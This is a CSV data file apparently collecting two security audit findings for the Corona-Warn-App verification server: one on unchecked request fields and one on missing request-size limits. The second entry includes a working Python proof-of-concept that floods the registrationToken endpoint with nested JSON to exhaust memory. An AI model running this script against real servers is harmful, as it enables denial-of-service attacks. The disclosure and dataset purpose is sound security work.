issue_no,repo,issue_url,title,description,patched_file_types
33,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/33,[BSI][0.3.1-alpha] Fields in Request Body not Checked,"Rating: Informational Description: Many of the PostMapping functions do not verify the structure of the request bodies before trying to access fields within the JSON data. In case a specific field is not present, the getter functions return Null which leads to NullPointerExceptions when further processing these values. Proof of Concept: [verification_fields_not_checked.txt](https://github.com/corona-warn-app/cwa-verification-server/files/4671782/verification_fields_not_checked.txt)",data-file | source-file | test-file
55,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/55,[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion,"Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {"""": we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: python import socket, sys if len(sys.argv) != 3: print (""usage %s target [size in MB]"" % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = ""POST /version/v1/registrationToken HTTP/1.1\r\n"" hdr += ""Host: ""+sys.argv[1]+"":8080\r\n"" hdr += ""Content-Type: application/json\r\n"" hdr += ""Transfer-Encoding: Chunked\r\n"" hdr += ""\r\n"" s.send(hdr) chunk = '{"""":'*256*1024 # we create lots of nested dicts chunk = ""%x\r\n%s\r\n"" % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(""\rSent %d MB"" % i) print(""\nDone"") #raw_input()",config-file | data-file | test-file
